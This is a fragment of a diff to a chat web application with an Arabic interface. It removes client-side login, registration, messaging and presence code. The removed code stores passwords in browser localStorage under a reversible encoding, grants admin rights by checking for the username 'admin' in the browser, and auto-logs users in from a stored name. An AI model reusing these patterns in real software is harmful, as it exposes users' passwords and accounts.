-            showNotification(`دخلت كمجهول (${currentUser})`);
-        }
-
-        function handlePageClose(reasonType) {
-            if (currentUser && !isAnonymous) {
-                if (reasonType === 'logout') setUserOnlineStatus(false, 'logout');
-                else setUserOnlineStatus(false, null);
-            }
-            stopHeartbeat();
-        }
-        window.addEventListener('beforeunload', () => handlePageClose('browser'));
-        window.addEventListener('pagehide', () => handlePageClose('site'));
-        window.addEventListener('offline', () => {
-            if (currentUser && !isAnonymous) {
-                setUserOnlineStatus(false, 'network');
-                showNotification('فقد الاتصال بالإنترنت');
-            }
-        });
-        window.addEventListener('online', () => {
-            if (currentUser && !isAnonymous) {
-                setUserOnlineStatus(true, 'online');
-                showNotification('تم استعادة الاتصال');
-            }
-        });
-
+        // --- Init ---
         document.addEventListener('DOMContentLoaded', async () => {
-            loadLocalData();
-            loadAutoLoginSetting();
+            await fetchUsers();
+            setupRealtimeMessages();
+            // ... rest of initUI and event listeners ...
 
-            setTimeout(() => {
-                const welcome = document.getElementById('welcomeScreen');
-                welcome.classList.add('hidden');
-                document.getElementById('loginContainer').classList.add('active');
-            }, 2000);
-
-            const registerAvatarGrid = document.getElementById('registerAvatarGrid');
-            logoAvatars.forEach(url => {
-                const div = document.createElement('div');
-                div.className = 'avatar-option';
-                div.innerHTML = `<img src="${url}" alt="logo">`;
-                div.onclick = () => {
-                    document.querySelectorAll('#registerAvatarGrid .avatar-option').forEach(opt => opt.classList.remove('selected'));
-                    div.classList.add('selected');
-                    selectedRegisterAvatar = url;
-                };
-                registerAvatarGrid.appendChild(div);
-            });
-            if (registerAvatarGrid.firstChild) {
-                registerAvatarGrid.firstChild.classList.add('selected');
-                selectedRegisterAvatar = logoAvatars[0];
-            }
-
-            let savedUsers = JSON.parse(localStorage.getItem('s46441_saved_users') || '[]');
-            savedUsers = savedUsers.map(saved => {
-                if (!saved.passwordBinary) saved.passwordBinary = '';
-                return saved;
-            }).filter(saved => saved.username && saved.passwordBinary);
-            
-            const suggestionsDiv = document.getElementById('loginSuggestions');
-            if (savedUsers.length) {
-                suggestionsDiv.innerHTML = `
-                    <div class="suggestions-title">حسابات سجلت من هذا الجهاز</div>
-                    <div class="suggestion-list" id="suggestionsList"></div>
-                `;
-                const list = document.getElementById('suggestionsList');
-                savedUsers.forEach((saved, idx) => {
-                    const item = document.createElement('div');
-                    item.className = 'suggestion-item';
-                    let plainPwd = '';
-                    if (saved.passwordBinary) {
-                        try {
-                            plainPwd = binaryToText(saved.passwordBinary);
-                        } catch(e) { plainPwd = '????'; }
-                    }
-                    item.innerHTML = `
-                        <div class="suggestion-avatar">${saved.username.charAt(0).toUpperCase()}</div>
-                        <div class="suggestion-info">
-                            <div class="suggestion-name">${escapeHtml(saved.username)}</div>
-                            <div class="suggestion-pwd">${'•'.repeat(Math.min(plainPwd.length, 8))}</div>
-                        </div>
-                        <div class="quick-action"><i class="fas fa-arrow-left"></i></div>
-                        <span class="suggestion-remove" data-idx="${idx}" title="إزالة"><i class="fas fa-trash-alt"></i></span>
-                    `;
-                    const fillHandler = (e) => {
-                        if (e.target.closest('.suggestion-remove')) return;
-                        document.getElementById('loginUsername').value = saved.username;
-                        document.getElementById('loginPassword').value = plainPwd;
-                    };
-                    item.addEventListener('click', fillHandler);
-                    const removeBtn = item.querySelector('.suggestion-remove');
-                    removeBtn.addEventListener('click', (e) => {
-                        e.stopPropagation();
-                        savedUsers.splice(idx, 1);
-                        localStorage.setItem('s46441_saved_users', JSON.stringify(savedUsers));
-                        const newEvent = new Event('DOMContentLoaded');
-                        document.dispatchEvent(newEvent);
-                        showNotification('تم إزالة الحساب من القائمة');
-                    });
-                    list.appendChild(item);
-                });
-            } else {
-                suggestionsDiv.style.display = 'none';
-            }
-
-            const tabs = document.querySelectorAll('.tab');
-            const loginTab = document.getElementById('loginTab');
-            const registerTab = document.getElementById('registerTab');
-            tabs.forEach(tab => {
-                tab.onclick = () => {
-                    tabs.forEach(t => t.classList.remove('active'));
-                    tab.classList.add('active');
-                    if (tab.dataset.tab === 'login') {
-                        loginTab.classList.add('active');
-                        registerTab.classList.remove('active');
-                    } else {
-                        registerTab.classList.add('active');
-                        loginTab.classList.remove('active');
-                    }
-                };
-            });
-
-            document.getElementById('loginBtn').onclick = async () => {
-                const username = document.getElementById('loginUsername').value.trim().toLowerCase();
-                const password = document.getElementById('loginPassword').value;
-                const remember = document.getElementById('rememberMe').checked;
-                try {
-                    await loginOrRegister(username, password, false);
-                    if (remember) {
-                        let saved = JSON.parse(localStorage.getItem('s46441_saved_users') || '[]');
-                        const passwordBinary = textToBinary(password);
-                        saved = saved.filter(u => u.username !== username);
-                        saved.unshift({ username, passwordBinary, timestamp: new Date().toISOString() });
-                        if (saved.length > 5) saved = saved.slice(0,5);
-                        localStorage.setItem('s46441_saved_users', JSON.stringify(saved));
-                    }
-                    if (autoLoginEnabled) {
-                        localStorage.setItem('s46441_currentUser', currentUser);
-                    } else {
-                        localStorage.removeItem('s46441_currentUser');
-                    }
-                    initUI();
-                    showNotification(`مرحباً ${currentUser}`);
-                } catch(err) {
-                    let errorDiv = document.getElementById('loginErrorMsg');
-                    if (!errorDiv) {
-                        errorDiv = document.createElement('div');
-                        errorDiv.id = 'loginErrorMsg';
-                        errorDiv.className = 'error-msg';
-                        document.querySelector('#loginTab .form-container').appendChild(errorDiv);
-                    }
-                    errorDiv.innerText = err.message;
-                }
-            };
-
-            document.getElementById('registerBtn').onclick = async () => {
-                const username = document.getElementById('registerUsername').value.trim().toLowerCase();
-                const password = document.getElementById('registerPassword').value;
-                const confirm = document.getElementById('registerConfirmPassword').value;
-                if (password !== confirm) { showNotification('كلمتا المرور غير متطابقتين'); return; }
-                try {
-                    await loginOrRegister(username, password, true, selectedRegisterAvatar);
-                    if (autoLoginEnabled) {
-                        localStorage.setItem('s46441_currentUser', currentUser);
-                    } else {
-                        localStorage.removeItem('s46441_currentUser');
-                    }
-                    initUI();
-                    showNotification(`تم إنشاء حساب ${username}`);
-                } catch(err) {
-                    showNotification(err.message);
-                }
-            };
-
-            document.getElementById('anonymousBtn').onclick = () => {
-                loginAnonymous();
-            };
-
-            document.getElementById('sendBtn').onclick = async () => {
-                const content = document.getElementById('messageInput').value.trim();
-                if (!content || !currentChatPartner) return;
-                await sendMessage(currentUser, currentChatPartner, content);
-                appendMessage({ sender: currentUser, receiver: currentChatPartner, content, timestamp: new Date().toISOString() });
-                document.getElementById('messageInput').value = '';
-            };
-            document.getElementById('messageInput').addEventListener('keypress', (e) => {
-                if (e.key === 'Enter' && !e.shiftKey) {
-                    e.preventDefault();
-                    document.getElementById('sendBtn').click();
-                }
-            });
-            document.getElementById('logoutBtn').onclick = logout;
-            document.getElementById('deleteAccountBtn').onclick = deleteAccount;
-            document.getElementById('backBtn').onclick = closeChat;
-
-            document.getElementById('settingsBtn').onclick = () => {
-                if (isAnonymous) { showNotification('المستخدم المجهول ليس لديه إعدادات'); return; }
-                openModal('settingsModal');
-            };
-            document.getElementById('changeUsernameBtn').onclick = changeOwnUsername;
-            document.getElementById('changePasswordBtn').onclick = changeOwnPassword;
-            document.getElementById('showOnlineCheckbox').onchange = togglePrivacy;
-            document.getElementById('adminPanelBtn').onclick = () => {
-                renderAdminPanel();
-                openModal('adminModal');
-            };
-            document.getElementById('openAvatarModalBtn').onclick = () => {
-                if (isAnonymous) { showNotification('المستخدم المجهول لا يمكنه تغيير الصورة'); return; }
-                showAvatarSelectionModal(changeAvatar, true);
-            };
-            const fullscreenBtn = document.getElementById('fullscreenAppBtn');
-            if (fullscreenBtn) fullscreenBtn.onclick = toggleFullScreen;
-
-            const autoLoginChk = document.getElementById('autoLoginCheckbox');
-            if (autoLoginChk) {
-                autoLoginChk.onchange = () => {
-                    saveAutoLoginSetting(autoLoginChk.checked);
-                    if (!autoLoginChk.checked) {
-                        localStorage.removeItem('s46441_currentUser');
-                    }
-                };
-            }
-
-            const savedCurrent = localStorage.getItem('s46441_currentUser');
-            if (autoLoginEnabled && savedCurrent && users.find(u => u.username === savedCurrent)) {
-                currentUser = savedCurrent;
-                isAdmin = (currentUser === 'admin');
-                isAnonymous = false;
-                const user = users.find(u => u.username === currentUser);
-                if (user) {
-                    user.online = false;
-                    user.lastSeen = new Date().toISOString();
-                    saveUsers();
-                }
-                currentUser = savedCurrent;
-                isAdmin = (currentUser === 'admin');
-                isAnonymous = false;
-                startHeartbeat();
-                setUserOnlineStatus(true, 'online');
-                initUI();
-                document.getElementById('welcomeScreen').classList.add('hidden');
-                document.getElementById('loginContainer').style.display = 'none';
-                document.getElementById('appContainer').style.display = 'flex';
-            }
-        });
 
         function togglePassword(fieldId) {
             const field = document.getElementById(fieldId);
@@ -1298,4 +552,3 @@
         }
     </script>
 </body>
-</html>
